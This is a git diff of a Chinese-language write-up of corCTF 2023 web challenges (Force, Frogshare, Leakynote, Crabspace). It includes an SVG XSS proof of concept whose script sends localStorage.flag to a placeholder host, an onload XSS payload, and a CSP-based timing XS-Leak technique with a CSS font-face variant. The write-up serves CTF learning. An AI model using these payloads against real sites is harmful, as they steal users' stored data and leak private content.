@@ -1,15 +1,13 @@
 ---
 tags: 
   - Rust
+  - SVG XSS
   - TODO
 ---
 
-
-# corctf 2023
+# corCTF 2023
 
 ## Force
-
-![](https://img.shields.io/badge/-WEB-blue?style=flat-square)
 
 题目生成了一个 `const secret = randomInt(0, 10 ** 5)` 1e5 的 sercret，提供一个 graphql 接口，可以通过 `pin` 参数来查询 flag，这里用到了 graphql 的一个性质，可以一次查询多个。
 
@@ -32,12 +30,91 @@ for cnt in range(10):
         print(r.text)
 ```
 
-
 ![](https://cdn.silente.top/img/202308152014418.png)
 
-## Crabspace
+## Frogshare
 
-![](https://img.shields.io/badge/-WEB-blue?style=flat-square)
+`/frog` 路由给了 POST 和 PATCH 一个添加 svg 一个修改 svg 的接口。 可以看看展示 svg 的代码：
+
+![](https://cdn.silente.top/img/202308190037793.png)
+
+这里的 `img` 以及 `svgProps` 均用户可控，~~但是直接注入 `img` 外链的话会被 CORS 拦下，~~ 反转了，自己服务器挂的 svg 没加 cors 头 hh，nginx 可以直接用 `add_header 'Access-Control-Allow-Origin' '*';` 加上。
+
+直接写 inline script 发现没法执行，才看到有个 `external-svg-loader` 库，需要手动开启：
+
+![](https://cdn.silente.top/img/202308190130562.png)
+
+
+Poc:
+```
+<svg width="100%" height="100%" viewBox="0 0 100 100"
+     xmlns="http://www.w3.org/2000/svg">
+  <circle cx="50" cy="50" r="45" fill="green"
+          id="foo"/>
+  <script type="text/javascript">
+    // <![CDATA[
+      fetch("https://domain/?flag=" + localStorage.flag).then();
+   // ]]>
+  </script>
+</svg>
+```
+
+![](https://cdn.silente.top/img/202308190124180.png)
+
+不过不知道为什么不能在 Props 里写 `onload`， 响应发现没有加载这玩意。
+
+```html
+<svg onload=alert('XSS')>
+```
+
+一些 svg hack: https://github.com/allanlw/svg-cheatsheet
+
+## Leakynote
+
+题目环境是用 PHP 写的，提供了用户注册登录以及写/搜索 post 的功能，flag 在 admin 的唯一一篇 post 中。看上去同样是一个 XSS 问题，这里 CSP 策略是：
+```
+Content-Security-Policy script-src 'none'; object-src 'none'; frame-ancestors 'none';
+```
+
+首先可以发现 XSS 点，在展示 post content 的时候没有转义：
+
+![](https://cdn.silente.top/img/202308232354518.png)
+
+可以发现题目的 CSP 十分严格，完全无法执行 js 代码，题目是 leak，可以往 leak 的角度去想，这里使用了 [HTTPLeaks](https://github.com/cure53/HTTPLeaks) 来进行验证，总之有很多方法均能发出 HTTP 请求，但这里并无法直接使用造成 leak。
+
+观察到 CSP 部分并没有在 PHP 代码里出现，而是写在了 nginx 中，并且 `add_header` 并不是 `always` 的。也就是说，当页面是 404 的时候，nginx 并不会返回 CSP 头，当页面是 200 的时候，nginx 会返回 CSP 头。
+
+![](https://cdn.silente.top/img/202308240023884.png)
+
+![](https://cdn.silente.top/img/202308240026297.png)
+
+也就是说我们需要寻找一个 leak，其在有无该题 CSP 策略时有两种不同表现。
+
+首先是一个 frame-ancestors 属性，其用于控制哪些页面可以嵌入当前页面，即控制当前页面的父级页面。当其有无时，其中的 iframe 表现不同：
+
+```
+<iframe src="/search.php?query=a"></iframe>
+```
+
+- 当 404 时没有该属性，iframe 可以嵌入当前页面，此时会一并加载 iframe 里的 css 文件，http req 请求的时间会变长
+- 当 200 时有该属性，iframe 无法嵌入当前页面，此时直接停止 iframe 内容的加载
+
+因此可以利用这一个 time 来进行 leak，每次枚举，选取一个时间最短的作为答案。
+
+贴份别人写好的 code: https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09
+
+还有一个 leak 的[思路](https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45)也学到了：
+
+```css
+@font-face {
+	  font-family: a;
+	  src: url(/time-before),url(/search.php?query=corctf{a),url(/search.php?query=corctf{a),... /*10000 times */,url(/time-after)
+}
+```
+
+然后被学长推荐了 xsleak 一览表：xsinator.com
+
+## Crabspace
 
 题目是用 Rust 写的， axum 作为 http Server， tera 作为模板渲染引擎。flag 是 admin 的 pass，给了一个 adminbot，所以存在 xss。
 
@@ -189,39 +266,3 @@ let session_layer = SessionLayer::new(store, &secret).with_secure(false);
 
 
 
-## Frogshare
-
-`/frog` 路由给了 POST 和 PATCH 一个添加 svg 一个修改 svg 的接口。 可以看看展示 svg 的代码：
-
-![](https://cdn.silente.top/img/202308190037793.png)
-
-这里的 `img` 以及 `svgProps` 均用户可控，~~但是直接注入 `img` 外链的话会被 CORS 拦下，~~ 反转了，自己服务器挂的 svg 没加 cors 头 hh，nginx 可以直接用 `add_header 'Access-Control-Allow-Origin' '*';` 加上。
-
-直接写 inline script 发现没法执行，才看到有个 `external-svg-loader` 库，需要手动开启：
-
-![](https://cdn.silente.top/img/202308190130562.png)
-
-
-Poc:
-```
-<svg width="100%" height="100%" viewBox="0 0 100 100"
-     xmlns="http://www.w3.org/2000/svg">
-  <circle cx="50" cy="50" r="45" fill="green"
-          id="foo"/>
-  <script type="text/javascript">
-    // <![CDATA[
-      fetch("https://domain/?flag=" + localStorage.flag).then();
-   // ]]>
-  </script>
-</svg>
-```
-
-![](https://cdn.silente.top/img/202308190124180.png)
-
-不过不知道为什么不能在 Props 里写 `onload`， 响应发现没有加载这玩意。
-
-```html
-<svg onload=alert('XSS')>
-```
-
-一些 svg hack: https://github.com/allanlw/svg-cheatsheet
